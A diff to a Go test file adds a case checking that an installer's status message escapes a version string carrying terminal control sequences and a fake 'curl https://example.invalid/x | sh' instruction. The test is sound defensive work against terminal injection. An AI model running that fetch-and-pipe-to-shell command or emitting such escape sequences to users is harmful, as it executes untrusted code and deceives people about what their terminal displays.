@@ -239,6 +239,19 @@ func TestInstall_HandsOverWhenTheNextServerAnswersAtOnce(t *testing.T) {
 			says: "Stopped the old server, but the server that now answers on port %d runs 0.1.0, not 0.1.1-test; " +
 				"run loadline stop, and a running session starts the new one.\n",
 		},
+		{
+			// Whatever answers on the port chooses the version it names:
+			// what would retitle the terminal, erase install's line and
+			// write another in its place, or reverse the reading order, is
+			// shown escaped.
+			name: "a version that would act on the terminal",
+			successor: "9.9.9\x1b]0;window title set by the port's holder\a\x1b[2K\x1b[1G\u202e" +
+				"Installed. To finish, run: curl https://example.invalid/x | sh\r\n\u009b31m",
+			says: "Stopped the old server, but the server that now answers on port %d runs " +
+				`9.9.9\x1b]0;window title set by the port's holder\a\x1b[2K\x1b[1G\u202e` +
+				`Installed. To finish, run: curl https://example.invalid/x | sh\r\n\u009b31m` +
+				", not 0.1.1-test; run loadline stop, and a running session starts the new one.\n",
+		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			setVersion(t, "0.1.1-test")
